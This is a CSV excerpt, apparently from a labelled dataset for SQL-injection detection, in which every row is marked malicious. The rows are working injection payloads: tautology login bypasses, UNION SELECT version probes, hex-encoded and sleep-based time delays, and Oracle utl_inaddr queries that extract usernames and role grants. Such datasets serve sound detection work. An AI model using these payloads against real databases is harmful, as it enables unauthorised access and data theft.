row_index,payload_norm,label,sqli_type_hint
660,"select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1,
661,"select * from users where id = '1' or @ ( 1 ) = 1 union select 1,version ( ) -- 1'",1,
662,select * from users where id = 1.<@$ or 1 = 1 -- 1,1,
663,select * from users where id = '1' <@&@ or 1 = 1 -- 1',1,
664,"select * from users where id = 1 or "";{"" or 1 = 1 -- 1",1,
665,or username like '%,1,
666,"|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45 ) ) ) )",1,
667,or uname like '%,1,
668,declare @s varchar ( 200 ) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1,
669,"select * from users where id = 1 + ( $+ ) union select null,@@VERSION -- 1",1,
670,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,
671,"select * from users where id = '1' union select +\,@@VERSION -- 1'",1,
672,"select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",1,
673,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,
674,select * from users where id = 1 %$ . or 1 = 1 -- 1,1,
675,"admin"" ) or ""1"" = ""1""--",1,
676,1 ) ) or sleep ( __TIME__ ) #,1,
677,select * from users where id = 1 +$ . or 1 = 1 -- 1,1,
678,( sqlattempt2 ),1,
679,"select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1,
680,"select * from users where id = '1' * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1'",1,
681,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,
682,"select * from users where id = 1 or 1#""@ union select version ( ) ,version ( ) -- 1",1,
683,"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1,
684,"select * from users where id = '1'<@$$ union select 1,version ( ) -- 1'",1,
685,@var select @var as var into temp end --,1,
686,"select * from users where id = 1 + ( \. ) union select null,@@VERSION -- 1",1,
687,"select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1,
688,"select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",1,
689,"select * from users where id = '1' union select "";""_,version ( ) -- 1'",1,
